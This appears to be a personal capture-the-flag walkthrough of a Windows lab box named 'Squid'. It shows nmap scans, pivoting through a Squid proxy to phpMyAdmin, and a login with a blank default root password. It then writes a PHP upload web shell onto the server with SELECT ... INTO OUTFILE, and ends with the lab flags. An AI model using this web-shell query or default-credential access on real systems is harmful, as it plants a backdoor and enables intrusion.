# Win - Squid

---

### Host

```bash
192.168.245.189
```

### Scan

```bash
// Quick scan.
> nmap -sV -T4 192.168.245.189

// Full TCP scan.
> nmap -sCV -A -Pn -O -p- 192.168.245.189 -oN tcpnmap.md

// Full UDP scan.
> sudo nmap -sU -Pn 192.168.245.189 --top-ports=100 --reason -oN udpnmap.md

PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3128/tcp  open  http-proxy    Squid http proxy 4.14
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/4.14
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC

Host script results:
| smb2-time: 
|   date: 2025-02-04T17:16:00
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

```

---

## Walkthrough

![image.png](Win%20-%20Squid%2018d553bebf0f80f4b9a1f742ceccc134/image.png)

- by search, squid can be used as proxy, found on hacktricks, use squid as proxy

https://book.hacktricks.wiki/en/network-services-pentesting/3128-pentesting-squid.html?highlight=squid#basic-information

![image.png](Win%20-%20Squid%2018d553bebf0f80f4b9a1f742ceccc134/image%201.png)

![image.png](Win%20-%20Squid%2018d553bebf0f80f4b9a1f742ceccc134/image%202.png)

- phpmyadmin - default password → root : “ “
- phpmyadmin version 5.0.2

![image.png](Win%20-%20Squid%2018d553bebf0f80f4b9a1f742ceccc134/image%203.png)

![image.png](Win%20-%20Squid%2018d553bebf0f80f4b9a1f742ceccc134/image%204.png)

![image.png](Win%20-%20Squid%2018d553bebf0f80f4b9a1f742ceccc134/image%205.png)

```bash
-> https://gist.github.com/BababaBlue/71d85a7182993f6b4728c5d6a77e669f

SELECT 
"<?php echo \'<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">\';echo \'<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form>\'; if( $_POST[\'_upl\'] == \"Upload\" ) { if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Done.<b><br><br>\'; }else { echo \'<b>Upload Failed.</b><br><br>\'; }}?>"
INTO OUTFILE 'C:/wamp/www/uploader.php';
```

![image.png](Win%20-%20Squid%2018d553bebf0f80f4b9a1f742ceccc134/image%206.png)

![image.png](Win%20-%20Squid%2018d553bebf0f80f4b9a1f742ceccc134/image%207.png)

https://gist.github.com/BababaBlue/71d85a7182993f6b4728c5d6a77e669f

```bash
python3 spose.py --proxy http://192.168.245.189:3128 --target 192.168.245.189 

/--------------------------------------
SELECT 
"<?php echo \'<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">\';echo \'<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form>\'; if( $_POST[\'_upl\'] == \"Upload\" ) { if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Done.<b><br><br>\'; }else { echo \'<b>Upload Failed.</b><br><br>\'; }}?>"
INTO OUTFILE 'C:/wamp/www/uploader.php';
--------------------------------------/

learning -> rlwarp
```

```bash
- local.txt : 26e2f239294af7ecd5e261827de3ba2d
- proof.txt : 4fd06171cd0323618567714a339b003c
```